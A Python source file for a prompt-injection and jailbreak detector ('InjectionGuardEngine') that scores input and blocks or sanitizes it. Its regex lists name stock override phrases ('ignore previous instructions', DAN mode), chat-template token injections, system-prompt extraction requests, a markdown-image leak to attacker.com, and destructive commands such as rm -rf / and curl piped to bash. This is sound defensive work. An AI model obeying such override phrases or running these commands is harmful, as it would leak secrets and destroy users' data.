"""
ksec.space Prompt Injection & Ingress AI Firewall Engine
Detects and mitigates:
- Direct & Indirect Prompt Injections
- Jailbreaks (DAN, Developer Mode, Persona Roleplay Overrides)
- Delimiter & System Role Hijacking (<|im_start|>, [SYSTEM], ```json system)
- Instruction Overriding ("Ignore all previous instructions", "Forget safety rules")
- Exfiltration Image / Markdown Exploits (![img](https://attacker.com/leak?q=...))
- Obfuscated Base64 / Hex payloads
"""

from __future__ import annotations
import re
import base64
from enum import Enum
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional, Tuple


class InjectionVerdict(str, Enum):
    ALLOW = "ALLOW"
    BLOCK = "BLOCK"
    SANITIZE = "SANITIZE"


@dataclass
class ThreatIndicator:
    rule_name: str
    severity: str  # HIGH, CRITICAL, MEDIUM, LOW
    weight: float
    description: str
    matched_snippet: str


@dataclass
class InjectionReport:
    verdict: InjectionVerdict
    threat_score: float  # 0.0 to 1.0
    threat_level: str   # CLEAN, LOW, SUSPICIOUS, CRITICAL
    indicators: List[ThreatIndicator]
    sanitized_prompt: Optional[str] = None
    is_blocked: bool = False


class InjectionGuardEngine:
    """
    Multi-layered Ingress AI Firewall against Prompt Injections and Jailbreaks.
    """

    # Critical override phrases
    _CRITICAL_OVERRIDE_PATTERNS = [
        (r"(?i)\bignore\s+(?:all\s+)?(?:previous|prior|above)\s+(?:instructions|prompts|rules|commands)\b", "Instruction Override: Ignore Previous Instructions", 0.95),
        (r"(?i)\bdisregard\s+(?:all\s+)?(?:safety|system|security)\s+(?:guidelines|rules|policies|protocols)\b", "Instruction Override: Disregard Safety Rules", 0.95),
        (r"(?i)\bforget\s+(?:all\s+)?(?:your\s+)?(?:instructions|rules|initial\s+prompt|constraints)\b", "Instruction Override: Forget Rules", 0.90),
        (r"(?i)\b(?:you\s+are\s+now\s+(?:in\s+)?)?(?:unrestricted\s+)?(?:DAN|developer|jailbreak|unrestricted|god)\s+mode\b", "Jailbreak: Persona Switch / DAN Mode", 0.95),
        (r"(?i)\bdo\s+anything\s+now\b", "Jailbreak: DAN Mantra", 0.90),
        (r"(?i)\bbypass\s+(?:all\s+)?(?:content|safety|security|openai|anthropic|guardrail)\s+(?:filters?|policies|policy|moderations?)\b", "Jailbreak: Bypass Content Filter", 0.90),
    ]

    # Delimiter and Token Injection Patterns
    _DELIMITER_INJECTION_PATTERNS = [
        (r"<\|im_start\|>\s*system", "Token Injection: ChatML System Token", 0.95),
        (r"<\|im_end\|>", "Token Injection: ChatML End Token", 0.85),
        (r"\[INST\]\s*<<SYS>>", "Token Injection: LLaMA System Token", 0.95),
        (r"\[\/INST\]", "Token Injection: LLaMA Instruction End", 0.80),
        (r"(?i)```(?:json|yaml)?\s*\{\s*\"role\"\s*:\s*\"system\"", "Role Hijacking: Inline JSON System Role", 0.90),
        (r"(?i)\n(?:system|assistant|admin)\s*:\s*(?:you\s+must|always|output\s+only)", "Role Impersonation: Direct Role Prefix", 0.85),
    ]

    # System Prompt Extraction / Exfiltration Patterns
    _EXTRACTION_PATTERNS = [
        (r"(?i)\b(?:repeat|print|output|display|reveal|leak|show)\s+(?:your\s+)?(?:initial|system|original|secret)\s+(?:prompt|instructions|rules|guidelines)\b", "Exfiltration: System Prompt Extraction Request", 0.85),
        (r"(?i)\bwhat\s+(?:were|are)\s+the\s+(?:exact\s+)?instructions\s+given\s+to\s+you\s+(?:at\s+the\s+beginning|above)\b", "Exfiltration: System Instruction Query", 0.80),
        (r"!\[(?:.*?)\]\((?:https?:\/\/[^\s\)]+[\?&](?:data|leak|token|prompt|q)=[^)]+)\)", "Exfiltration: Markdown Image URL Beaconing", 0.95),
    ]

    # Dangerous Shell/OS/SQL Injection within Agent Context
    _EXECUTION_EXPLOITS = [
        (r"(?i)\b(?:rm\s+-rf\s+\/|drop\s+database|format\s+c:|mkfs\.ext4)\b", "Dangerous Payload: Destruction Command", 0.98),
        (r"(?i)\bcurl\s+(?:-[a-zA-Z]+\s+)*https?:\/\/[^\s]+\s*\|\s*(?:bash|sh)\b", "Dangerous Payload: Pipe to Shell", 0.95),
    ]

    def __init__(self, block_threshold: float = 0.80, sanitize_threshold: float = 0.50):
        self.block_threshold = block_threshold
        self.sanitize_threshold = sanitize_threshold

    def _check_base64_payloads(self, text: str) -> List[ThreatIndicator]:
        """Detects and decodes hidden base64 chunks looking for obfuscated attack vectors."""
        indicators = []
        # Find potential base64 strings (length >= 24)
        b64_candidates = re.findall(r"\b[A-Za-z0-9+/]{24,}={0,2}\b", text)
        for cand in b64_candidates:
            try:
                decoded_bytes = base64.b64decode(cand, validate=True)
                decoded_str = decoded_bytes.decode("utf-8", errors="ignore")
                if len(decoded_str) > 10:
                    # Recursive scan of decoded text
                    sub_report = self.inspect(decoded_str)
                    if sub_report.threat_score >= 0.70:
                        indicators.append(ThreatIndicator(
                            rule_name="Obfuscation: Base64 Encoded Exploit",
                            severity="CRITICAL",
                            weight=0.95,
                            description=f"Decoded Base64 payload contained high threat: {sub_report.indicators[0].description if sub_report.indicators else 'Jailbreak'}",
                            matched_snippet=cand[:30] + "..."
                        ))
            except Exception:
                continue
        return indicators

    def inspect(self, prompt: str, tenant_id: Optional[str] = "global") -> InjectionReport:
        """
        Analyzes prompt text against all injection vectors, jailbreak patterns and calculates threat score.
        """
        if not prompt or not prompt.strip():
            return InjectionReport(
                verdict=InjectionVerdict.ALLOW,
                threat_score=0.0,
                threat_level="CLEAN",
                indicators=[],
                sanitized_prompt=prompt,
                is_blocked=False
            )

        indicators: List[ThreatIndicator] = []

        # 1. Critical Instruction Overrides
        for pattern, desc, weight in self._CRITICAL_OVERRIDE_PATTERNS:
            match = re.search(pattern, prompt)
            if match:
                indicators.append(ThreatIndicator(
                    rule_name="Instruction Override",
                    severity="CRITICAL",
                    weight=weight,
                    description=desc,
                    matched_snippet=match.group(0)
                ))

        # 2. Delimiter & Token Injection
        for pattern, desc, weight in self._DELIMITER_INJECTION_PATTERNS:
            match = re.search(pattern, prompt)
            if match:
                indicators.append(ThreatIndicator(
                    rule_name="Delimiter Hijack",
                    severity="HIGH",
                    weight=weight,
                    description=desc,
                    matched_snippet=match.group(0)
                ))

        # 3. System Prompt Extraction & Data Exfiltration
        for pattern, desc, weight in self._EXTRACTION_PATTERNS:
            match = re.search(pattern, prompt)
            if match:
                indicators.append(ThreatIndicator(
                    rule_name="Exfiltration Probe",
                    severity="HIGH",
                    weight=weight,
                    description=desc,
                    matched_snippet=match.group(0)
                ))

        # 4. OS/SQL Destruction Commands
        for pattern, desc, weight in self._EXECUTION_EXPLOITS:
            match = re.search(pattern, prompt)
            if match:
                indicators.append(ThreatIndicator(
                    rule_name="Destructive Command",
                    severity="CRITICAL",
                    weight=weight,
                    description=desc,
                    matched_snippet=match.group(0)
                ))

        # 5. Base64 Obfuscation Scanner
        b64_indicators = self._check_base64_payloads(prompt)
        indicators.extend(b64_indicators)

        # Calculate compound threat score
        if not indicators:
            threat_score = 0.0
            threat_level = "CLEAN"
            verdict = InjectionVerdict.ALLOW
            is_blocked = False
        else:
            # Max weight + diminishing marginal weights
            weights = sorted([ind.weight for ind in indicators], reverse=True)
            threat_score = min(1.0, weights[0] + sum(w * 0.1 for w in weights[1:]))

            if threat_score >= self.block_threshold:
                threat_level = "CRITICAL"
                verdict = InjectionVerdict.BLOCK
                is_blocked = True
            elif threat_score >= self.sanitize_threshold:
                threat_level = "SUSPICIOUS"
                verdict = InjectionVerdict.SANITIZE
                is_blocked = False
            else:
                threat_level = "LOW"
                verdict = InjectionVerdict.ALLOW
                is_blocked = False

        # Build sanitized prompt if needed
        sanitized_prompt = prompt
        if verdict == InjectionVerdict.SANITIZE:
            for ind in indicators:
                sanitized_prompt = sanitized_prompt.replace(ind.matched_snippet, "[REMOVED_INJECTION_SNIPPET]")

        return InjectionReport(
            verdict=verdict,
            threat_score=round(threat_score, 3),
            threat_level=threat_level,
            indicators=indicators,
            sanitized_prompt=sanitized_prompt,
            is_blocked=is_blocked
        )


injection_guard = InjectionGuardEngine()
